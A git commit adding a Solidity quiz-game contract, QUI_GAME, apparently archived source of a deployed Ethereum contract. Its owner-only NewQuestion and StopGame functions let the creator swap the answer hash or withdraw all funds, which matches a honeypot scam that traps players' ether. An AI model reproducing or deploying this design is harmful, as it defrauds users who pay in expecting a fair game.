282b4752108213d449de98d05b01dde9c42ffb05
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-17 16:45:18 +0700

    add contract QUI_GAME

---
+++ QUI_GAME.sol
@@ -0,0 +1,55 @@
+/* 
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract QUI_GAME at 0x159d2829613B0FE363e462B218c695C6eae0a5e1
+*/
+pragma solidity ^0.4.20;
+
+contract QUI_GAME
+{
+    function Play(string _response)
+    external
+    payable
+    {
+        require(msg.sender == tx.origin);
+        if(responseHash == keccak256(_response) && msg.value>1 ether)
+        {
+            msg.sender.transfer(this.balance);
+        }
+    }
+    
+    string public question;
+ 
+    address questionSender;
+  
+    bytes32 responseHash;
+ 
+    function StartGame(string _question,string _response)
+    public
+    payable
+    {
+        if(responseHash==0x0)
+        {
+            responseHash = keccak256(_response);
+            question = _question;
+            questionSender = msg.sender;
+        }
+    }
+    
+    function StopGame()
+    public
+    payable
+    {
+       require(msg.sender==questionSender);
+       msg.sender.transfer(this.balance);
+    }
+    
+    function NewQuestion(string _question, bytes32 _responseHash)
+    public
+    payable
+    {
+        require(msg.sender==questionSender);
+        question = _question;
+        responseHash = _responseHash;
+    }
+    
+    function() public payable{}
+}
